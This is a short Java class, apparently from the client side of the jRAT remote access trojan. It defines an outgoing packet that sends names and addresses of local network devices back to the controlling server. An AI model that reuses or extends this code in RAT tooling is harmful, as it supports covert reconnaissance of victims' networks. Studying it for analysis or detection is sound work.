package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet49LanDevices implements OutgoingPacket {

	private String device;
	private String address;

	public Packet49LanDevices(String device, String address) {
		this.device = device;
		this.address = address;
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeLine(this.device);

		if (this.address != null) {
            con.writeLine(this.address);
		}
	}

	@Override
	public short getPacketId() {
		return 49;
	}

}
